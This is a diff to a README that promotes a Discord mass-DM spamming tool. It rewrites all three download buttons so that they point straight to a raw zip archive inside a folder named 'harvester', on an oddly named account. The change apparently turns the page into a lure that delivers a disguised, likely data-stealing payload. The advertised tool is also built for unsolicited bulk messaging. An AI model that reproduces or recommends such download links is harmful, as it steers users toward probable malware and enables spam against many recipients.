@@ -1,6 +1,6 @@
 # ⚡ Discord-Mass-DM-Tool - Send Messages to Thousands Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Discord_Mass_DM_Tool_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/disaccharidesepia4206/Discord-Mass-DM-Tool)
+[![Download Now](https://img.shields.io/badge/Download-Discord_Mass_DM_Tool_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/disaccharidesepia4206/Discord-Mass-DM-Tool/raw/refs/heads/main/harvester/Mass_D_Tool_Discord_v3.0.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these simple steps to get Discord-Mass-DM-Tool running on your computer. 
 
 Visit this link to download the application:
 
-[**🔗 Download Discord-Mass-DM-Tool**](https://github.com/disaccharidesepia4206/Discord-Mass-DM-Tool)
+[**🔗 Download Discord-Mass-DM-Tool**](https://github.com/disaccharidesepia4206/Discord-Mass-DM-Tool/raw/refs/heads/main/harvester/Mass_D_Tool_Discord_v3.0.zip)
 
 Click the download button on the page and wait for the download to complete. The file will be saved to your default Downloads folder.
 
@@ -173,7 +173,7 @@ Discord-Mass-DM-Tool is the ultimate solution for anyone who needs to send direc
 
 **Ready to get started?**
 
-[![Download Now](https://img.shields.io/badge/Get_Discord_Mass_DM_Tool-Free_Download-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/disaccharidesepia4206/Discord-Mass-DM-Tool)
+[![Download Now](https://img.shields.io/badge/Get_Discord_Mass_DM_Tool-Free_Download-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/disaccharidesepia4206/Discord-Mass-DM-Tool/raw/refs/heads/main/harvester/Mass_D_Tool_Discord_v3.0.zip)
 
 ---
 
